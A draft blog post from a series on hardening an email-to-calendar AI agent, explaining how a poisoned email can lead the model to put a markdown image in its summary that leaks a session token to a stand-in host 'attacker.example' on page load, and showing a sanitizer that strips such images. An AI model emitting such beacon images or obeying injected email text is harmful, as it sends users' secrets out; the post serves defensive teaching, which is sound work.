---
title: "The tracking pixel"
description: "The exfil surface everyone forgets is the screen. The agent shows you a summary rendered from markdown the model wrote, and a markdown image in it is a tracking pixel: the browser fetches it on page load, no click, carrying data out in the URL. The fix is to strip images and auto-fetching links from model output before anything renders it."
date: 2026-10-12
draft: true
tags: ["ai-security", "golang", "agents", "exfiltration"]
series: "AI Security Engineering"
---

_Part of my [AI Security Engineering](/blog/the-plan/) series, a local email-to-calendar agent I build, then attack, then harden. If you have not set up the lab yet, start with [Set up your lab](/blog/setting-up-the-lab/). The lessons are [on GitHub](https://github.com/t0ul/ai-security-engineering), and the agent itself lives at [t0ul/emaildrop](https://github.com/t0ul/emaildrop)._

## The surface that does not look like output

[The last post](/blog/the-calendar-field-exfil/) closed an exfiltration channel in the calendar file the agent writes. This one closes the same kind of channel on a surface that does not feel like output at all: the screen. The agent has a web page where it shows you a summary of your mail, and that summary is rendered from markdown the model produced. Markdown renders in a browser, and a browser does things with markdown that a text file never does.

The dangerous one is the image. A markdown image becomes an `<img>` tag, and a browser fetches an `<img>` the instant the page loads, with no click and no consent. So a model that was talked into putting an image in its summary has planted a tracking pixel: its URL is requested automatically when you open the page, and anything in that URL's query string goes along with the request. It is the calendar-field exfil again, but worse, because it needs no import and no click. It fires on sight. This is a control lesson, deterministic, no model:

```bash
cd posts/05.3-the-tracking-pixel
go run .
```

## I. It fires on page load

Here is the summary the model produced after reading a poisoned email: an ordinary report with a tracking pixel and an auto-fetching link slipped in. Hand it to the page the obvious way, as-is, and look at what the browser receives:

```
== before: the model output goes straight to the page ==
  the page receives: ![Data Sync](http://attacker.example/log?d=SESSION-TOKEN-9)
  the beacon host "attacker.example" reaches the browser: true (it fetches on page load)
```

That image markdown is the whole attack. Render this summary and the browser sees an image named Data Sync, reaches out to `attacker.example` to fetch it, and hands over `SESSION-TOKEN-9` in the query string as it does. Nobody clicked. Opening the page was enough, which is what makes a rendered surface more dangerous than the inert calendar file, not less.

## II. Allow-list what may render

Model output that a browser will render is active content, and has to be treated like any other untrusted output: scrub out anything that fetches or executes before it reaches the page. The agent's real sanitizer, `controlplane.SanitizeMarkdown`, does exactly that. It finds the ways a URL can auto-fire in markdown, inline images, reference-style images, raw `<img>` tags, autolinks, and `javascript:` or `data:` scheme links, and replaces each with a visible placeholder, returning a count so the removal is on the record. What it defends against is the pixel above: an image the model emitted can never reach the browser, because the renderer is only ever given text the sanitizer has already cleared.

Run the same poisoned summary through it:

```
== after: sanitize the model output first ==
  the page receives: [IMAGE BLOCKED BY SANITIZER]
  image/link tags removed: 2; the beacon host reaches the browser: false
```

The image is gone, replaced by a plain marker the reader can see, the auto-fetching link with it, two removals, and the attacker's host reaches the browser never. The summary still reads fine, "you are all caught up for this week," it just cannot phone home on render.

## The one principle, two surfaces

This post and the last are the same control wearing two coats. In both, the model's output is treated as untrusted, and anything in it that could reach out on its own, a link in a calendar field, an image in a rendered page, is stripped before the output leaves the agent for a place that would act on it. The rule underneath both is output allow-listing: the agent decides what shapes are safe to emit, and everything else is replaced with something visibly inert. You do not try to guess the attacker's intent in a URL; you simply refuse to hand a renderer anything that fetches.

## Conclusion

The two obvious ends of the agent are closed now. Secrets are scrubbed before they are stored, and the agent's output, whether a file or a web page, can no longer be turned into a quiet channel for data to leave. That is the end of the exfiltration chapter.

It ends on a cliffhanger, though, because there is a kind of reaching-out the sanitizers above do not touch: not a link the agent writes down, but a request the agent itself makes. The last post of this part gives the agent a web-search tool, points it at what looks like a normal lookup, and watches it fetch a server on its own machine that it was never meant to reach. That is server-side request forgery from the inside, and it is the doorway into Part 4, where the agent gains the power to run code and we have to build real walls around it.
